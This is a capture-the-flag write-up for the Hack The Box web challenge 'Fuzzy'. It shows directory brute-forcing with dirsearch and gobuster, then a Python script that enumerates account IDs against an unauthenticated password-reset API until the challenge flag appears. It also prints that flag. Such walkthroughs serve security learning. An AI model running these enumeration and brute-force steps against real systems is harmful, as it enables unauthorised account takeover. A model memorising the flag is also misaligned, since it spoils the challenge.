# Fuzzy

## Home page

Let's connect to the home page. We see a page under developmeent. No link is actually working.

~~~
unknown@localhost:/data/documents/challenges/hackthebox/03-challenges/Web/20-Fuzzy$ curl -s http://docker.hackthebox.eu:30000
<html>
<head>
    <title>Acme Inc</title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="js/bootstrap.min.js"></script>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand" href="#">ACME INC</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>

    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
                <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#">Link</a>
            </li>
            <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Dropdown
            </a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                <a class="dropdown-item" href="#">Action</a>
                <a class="dropdown-item" href="#">Another action</a>
                <div class="dropdown-divider"></div>
                <a class="dropdown-item" href="#">Something else here</a>
            </div>
            </li>
            <li class="nav-item">
                <a class="nav-link disabled" href="#">Disabled</a>
            </li>
        </ul>
        <form class="form-inline my-2 my-lg-0">
            <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
            <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
        </form>
        </div>
    </nav>
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <br>
                <h1>Welcome to Acme Inc!</h1>
                <p>Everything is still under development. Hopefully I will have an account creation and login/password reset functions ready soon!</p>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <h2>Lorem Ipsum</h2>
            </div>
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed ultrices congue pellentesque. Phasellus cursus vulputate tristique. Maecenas vestibulum porttitor dui eget faucibus. Quisque ac tortor placerat, consequat enim sit amet, faucibus nisl. Etiam tincidunt eros a metus dignissim, et ultrices urna mattis. Cras a faucibus velit. Curabitur ornare, risus id mattis varius, sem quam sodales dui, ac scelerisque tortor tortor sed velit. Etiam imperdiet, orci sed bibendum lobortis, nunc dolor fermentum velit, a vulputate dolor velit nec urna. Aenean sed metus ipsum. Nulla tincidunt libero non mauris tempor, vitae luctus quam efficitur. In rhoncus augue sit amet nisl viverra condimentum vitae eu mi. Mauris vehicula nisl ac ipsum elementum facilisis.</p>
            </div>
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
                <p>Nulla vel facilisis nisl. Nam eu tincidunt arcu. Phasellus iaculis ante sed molestie sagittis. Mauris vehicula mauris ex, et tempus lorem pellentesque sit amet. Etiam a porta ante. Maecenas lacinia lorem id vulputate ullamcorper. Curabitur maximus est nulla, quis efficitur ante ullamcorper in. Nullam gravida sodales nibh, non eleifend mauris maximus eu. Aenean quis iaculis elit. Nam tincidunt ipsum sit amet porta sodales. Aenean ornare elit et posuere tincidunt.</p>
            </div>
        </div>
    </div>
</body>
</html>
~~~

## API

Brute forcing the discovery of directories reveals the existence of an `/api` directory:

~~~
y$ /data/src/dirsearch/dirsearch.py -u http://docker.hackthebox.eu:30000/ -E -w /data/src/wordlists/directory-list-2.3-medium.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 220529

Error Log: /data/src/dirsearch/logs/errors-20-06-14_11-53-45.log

Target: http://docker.hackthebox.eu:30000/

[11:53:45] Starting: 
[11:53:46] 200 -    4KB - /
[11:53:50] 301 -  178B  - /css  ->  http://docker.hackthebox.eu/css/
[11:53:53] 301 -  178B  - /js  ->  http://docker.hackthebox.eu/js/
[11:53:53] 301 -  178B  - /api  ->  http://docker.hackthebox.eu/api/

Task Completed
~~~

Connecting to http://hackthebox.eu:30000/api/ doesn't reveal anything as it points to index.html which is an empty page, obviously left here to protect against directory listing.

Let's check if there is any interesting subdirectory inside `api`:

~~~
$ gobuster dir -u http://docker.hackthebox.eu:30000/api/ -w /data/src/wordlists/common.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.hackthebox.eu:30000/api/
[+] Threads:        10
[+] Wordlist:       /data/src/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/06/14 12:22:40 Starting gobuster
===============================================================
/action.php (Status: 200)
/index.html (Status: 200)
===============================================================
2020/06/14 12:23:16 Finished
===============================================================
~~~

## API parameters

### reset

Nice, there is an `action.php` script inside the `api` directory.

Now, that we know more about the API, let's send a parameter. There are obvious hints in the text from the home page about future expected features (login, reset). Let's test:

~~~
$ curl -s http://docker.hackthebox.eu:30000/api/action.php?login
Error: Parameter not set
$ curl -s http://docker.hackthebox.eu:30000/api/action.php?reset
Error: Account ID not found
~~~

### id

~~~
$ curl -s http://docker.hackthebox.eu:30000/api/action.php?reset=1
Error: Account ID not found
~~~

Let's write a python script that will brute force ID until a valid one is found:

```python
#!/usr/bin/env python

import requests

host, port = 'docker.hackthebox.eu', 30000

id = 1
while True:
	r = requests.get('http://{}:{}/api/action.php?reset={}'.format(
		host, port, id))
	if not 'Error: Account ID not found' in r.text:
		print(r.text)
		break
	id += 1
```

Here is the output:

~~~
$ python findid.py 
You successfully reset your password! Please use HTB{h0t_fuzz3r} to login.
~~~

# Flag

Flag: `HTB{h0t_fuzz3r}`
